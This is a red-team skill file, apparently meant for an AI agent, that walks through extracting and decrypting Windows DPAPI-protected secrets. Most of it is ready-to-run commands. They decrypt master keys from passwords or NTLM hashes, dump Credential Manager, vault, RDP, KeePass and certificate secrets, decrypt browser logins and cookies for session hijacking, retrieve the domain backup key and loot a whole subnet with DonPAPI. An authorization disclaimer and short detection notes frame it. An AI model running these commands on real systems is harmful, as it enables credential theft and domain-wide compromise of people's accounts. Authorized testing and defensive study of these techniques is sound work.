---
name: abusing-dpapi-for-credential-access
description: Extract and decrypt Windows DPAPI-protected secrets (Credential Manager, browser logins/cookies, Wi-Fi credentials, KeePass keys) online or offline using SharpDPAPI, SharpChrome, Mimikatz, or Impacket's dpapi.py, including domain-wide decryption via the DPAPI backup key.
subdomain: red-teaming
facing: config
mitre_attack:
- T1555.004
nist_csf:
- DE.CM-01
upstream: abusing-dpapi-for-credential-access@54a7988 Apache-2.0, modified by wesh
---
> Authorized use only: written scope / rules of engagement first. Refuse targets outside scope.
> Legal: This skill is for authorized penetration testing, red-team engagements, and educational purposes only. Extracting credentials from systems you do not own or lack explicit written authorization to test is illegal and may violate computer fraud and abuse laws. Always operate within a signed rules-of-engagement and document every action.

## Prerequisites

- Authorized foothold (interactive session, beacon, or remote admin) on target Windows host.
- Knowledge of target user's SID, and one of: user's session, password, NTLM hash, or Domain Admin rights for backup key.
- Tooling (compile from source or use release binaries; obtain only from official upstreams):

```bash
# SharpDPAPI / SharpChrome (GhostPack) — build with Visual Studio / msbuild
git clone https://github.com/GhostPack/SharpDPAPI.git
# Open SharpDPAPI.sln and build Release, or:
msbuild SharpDPAPI.sln /p:Configuration=Release

# Mimikatz (original DPAPI implementation)
# https://github.com/gentilkiwi/mimikatz/releases

# Linux remote/offline triage (Impacket)
pipx install impacket            # provides dpapi.py / impacket-dpapi
pipx install donpapi             # https://github.com/login-securite/DonPAPI
```

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic | Relevance |
|--------------|------|--------|-----------|
| T1555.004 | Credentials from Password Stores: Windows Credential Manager | Credential Access | DPAPI protects Credential Manager / Vault entries; decrypting master keys and blobs recovers these stored credentials. |
| T1555.003 | Credentials from Password Stores: Credentials from Web Browsers | Credential Access | SharpChrome decrypts DPAPI-protected Chrome/Edge logins, cookies, and state keys. |
| T1003 | OS Credential Dumping | Credential Access | Extracting master keys / backup keys is form of credential material dumping. |

## Workflow

### 1. Triage host for DPAPI blobs

Run SharpDPAPI `triage` command in user's context to automatically enumerate and (where possible) decrypt credentials, vaults, RDG/RDP, and certificates:

```powershell
# Online triage in the current user's context (uses CryptUnprotectData)
SharpDPAPI.exe triage /unprotect

# Machine triage (requires local admin / SYSTEM) for machine-scoped blobs
SharpDPAPI.exe machinetriage
```

### 2. Decrypt user master keys offline (password or NTLM hash)

If you hold user's password or hash, decrypt their master keys to a `{GUID}:SHA1` mapping you can reuse against individual blobs:

```powershell
# Decrypt all of the current/specified user's master keys with the password
SharpDPAPI.exe masterkeys /password:CorrectHorseBatteryStaple

# Decrypt master keys with the user's NTLM hash instead of the password
SharpDPAPI.exe masterkeys /ntlm:cc36cf7a8514893efccd332446158b1a

# Output is GUID:SHA1 lines — feed them to credentials/vaults commands
```

### 3. Recover Credential Manager and Vault secrets

Use decrypted master-key mapping (or `/pvk:`) to decrypt stored credentials and vault entries:

```powershell
# Decrypt Credential Manager blobs with a GUID:SHA1 mapping
SharpDPAPI.exe credentials {GUID1}:SHA1 {GUID2}:SHA1

# Or point at a target Credentials folder and decrypt with the domain backup key
SharpDPAPI.exe credentials /target:C:\Users\bob\AppData\Local\Microsoft\Credentials\ /pvk:backupkey.pvk

# Decrypt Credential Vault entries
SharpDPAPI.exe vaults /pvk:backupkey.pvk
```

### 4. Decrypt RDP, KeePass, and certificate secrets

```powershell
# Saved RDCMan.settings RDP passwords (current user context)
SharpDPAPI.exe rdg /unprotect

# KeePass DPAPI-protected master keys
SharpDPAPI.exe keepass /unprotect

# Certificate private keys (export usable .pem with /showall for all stores)
SharpDPAPI.exe certificates /unprotect /showall
```

### 5. Extract browser credentials with SharpChrome

SharpChrome decrypts Chrome/Edge logins and cookies. Modern Chromium uses App-Bound "state key" that SharpChrome resolves via DPAPI:

```powershell
# Decrypt saved logins for the current user
SharpChrome.exe logins /unprotect

# Decrypt cookies (useful for session hijacking) in a target folder
SharpChrome.exe cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies" /pvk:backupkey.pvk

# Resolve the AES state key explicitly
SharpChrome.exe statekeys /unprotect
```

### 6. Obtain domain DPAPI backup key (Domain Admin)

With Domain Admin, retrieve domain's RSA DPAPI backup private key once. This key decrypts every domain user's master keys indefinitely:

```powershell
# Pull and save the domain backup key as a .pvk via the MS-BKRP RPC interface
SharpDPAPI.exe backupkey /server:dc01.corp.local /file:backupkey.pvk
```

Then decrypt any user's master keys offline with it:

```powershell
SharpDPAPI.exe masterkeys /pvk:backupkey.pvk /target:C:\Users\alice\AppData\Roaming\Microsoft\Protect\
```

### 7. Remote / Linux-based triage (Impacket / DonPAPI)

From Linux operator box, harvest and decrypt DPAPI secrets across hosts:

```bash
# Decrypt a single masterkey file with Impacket using the domain backup key
impacket-dpapi masterkey -file <masterkey_file> -pvk backupkey.pvk

# Decrypt a credential blob with the recovered masterkey
impacket-dpapi credential -file <cred_blob> -key 0x<decrypted_masterkey>

# Mass remote DPAPI looting across hosts with DonPAPI
donpapi collect -u alice -p 'Password123!' -d corp.local --target 10.0.0.0/24
```

## Tools and Resources

| Tool | Purpose | Link |
|------|---------|------|
| SharpDPAPI | Windows DPAPI triage/decryption (C#) | https://github.com/GhostPack/SharpDPAPI |
| SharpChrome | Chromium logins/cookies/state-key decryption | https://github.com/GhostPack/SharpDPAPI |
| Mimikatz | Original DPAPI (`dpapi::*`) implementation | https://github.com/gentilkiwi/mimikatz |
| Impacket dpapi.py | Remote/offline DPAPI decryption (Python) | https://github.com/fortra/impacket |
| DonPAPI | Mass remote DPAPI looting | https://github.com/login-securite/DonPAPI |
| HackTricks DPAPI | Technique reference | https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords.html |

## Detection and OPSEC Notes

- Master-key access and reads of `\Microsoft\Protect\` and `\Microsoft\Credentials\` are detectable; `backupkey` triggers MS-BKRP RPC call to DC.
- The `/unprotect` (online) path is stealthiest single-host option but only works as live user.
- Defenders should monitor for Sysmon process access to LSASS and abnormal access to Protect/Credentials folders (DE.CM-01).

## Validation Criteria

- [ ] Host triaged with `SharpDPAPI triage` / `machinetriage`.
- [ ] User master keys decrypted via `/unprotect`, `/password:`, `/ntlm:`, or `/pvk:`.
- [ ] Credential Manager and Vault secrets recovered.
- [ ] RDP / KeePass / certificate secrets extracted where present.
- [ ] Browser logins/cookies decrypted with SharpChrome.
- [ ] Domain DPAPI backup key retrieved with Domain Admin (if in scope) and reused offline.
- [ ] All recovered secrets documented with source host/user and ROE adherence confirmed.

Not vendored (scripts/, references/): https://github.com/mukul975/Anthropic-Cybersecurity-Skills/tree/54a798831d2266a3ca61ce68a7acb80b81160d57/skills/abusing-dpapi-for-credential-access
